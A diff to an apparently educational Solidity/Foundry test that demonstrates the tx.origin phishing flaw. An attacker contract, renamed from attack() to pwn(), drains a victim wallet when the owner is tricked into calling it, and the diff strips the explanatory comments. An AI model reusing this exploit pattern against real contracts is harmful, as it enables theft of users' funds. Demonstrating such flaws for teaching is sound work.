@@ -35,21 +35,21 @@ contract ContractTest is Test {
     function testtxorigin() public {
         address alice = vm.addr(1);
         address eve = vm.addr(2);
+
         vm.deal(address(alice), 10 ether);
         vm.deal(address(eve), 1 ether);
         vm.prank(alice);
         WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
         console.log("Owner of wallet contract", WalletContract.owner());
+
         vm.prank(eve);
-        AttackerContract = new Attack(WalletContract); //Eve deploys Attack with the address of Alice's Wallet contract.
-        console.log("Owner of attack contract", AttackerContract.owner());
-        console.log("Eve of balance", address(eve).balance);
+        AttackerContract = new Attack(WalletContract);
+        console.log("Owner of attacker contract", AttackerContract.owner());
 
         vm.prank(alice, alice);
-        AttackerContract.attack(); // Eve tricks Alice to call AttackerContract.attack()
-        console.log("tx origin address", tx.origin);
-        console.log("msg.sender address", msg.sender);
-        console.log("Eve of balance", address(eve).balance);
+        AttackerContract.pwn();
+
+        console.log("balance of bob", eve.balance);
     }
 
     receive() external payable {}
@@ -79,8 +79,7 @@ contract Attack {
         wallet = Wallet(_wallet);
         owner = payable(msg.sender);
     }
-
-    function attack() public {
-        wallet.transfer(owner, address(wallet).balance);
+    function pwn() public {
+        wallet.transfer(owner, 10 ether);
     }
 }
